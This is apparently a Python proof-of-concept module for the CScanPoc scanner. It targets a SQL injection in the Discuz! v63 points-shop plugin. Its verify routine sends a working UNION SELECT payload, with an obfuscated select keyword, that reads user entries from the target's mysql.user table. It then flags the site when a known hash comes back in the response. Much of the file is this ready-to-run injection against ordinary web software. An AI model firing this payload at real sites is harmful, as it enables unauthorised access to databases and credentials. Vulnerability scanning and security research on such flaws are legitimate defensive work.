# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Discuz_0025'  # 平台漏洞编号，留空
    name = 'Discuz! v63积分商城插件注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2013-03-26'  # 漏洞公布时间
    desc = '''
        Discuz! /discuzx2/plugin.php?id=v63shop:goods SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/419/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Discuz!'  # 漏洞应用名称
    product_version = 'Discuz X1.5-2.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f9050c66-f380-42d2-a52e-f15968cc0481'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-12'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/discuzx2/plugin.php?id=v63shop:goods&pac=info&gid=1 and 1=2 union /*!50000select*/ 1,2,3,4,5,6,concat(user,0x23,md5(c)),8,9,10,11,12,13 from mysql.user"
            url = self.target + payload
            r = requests.get(url)
            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
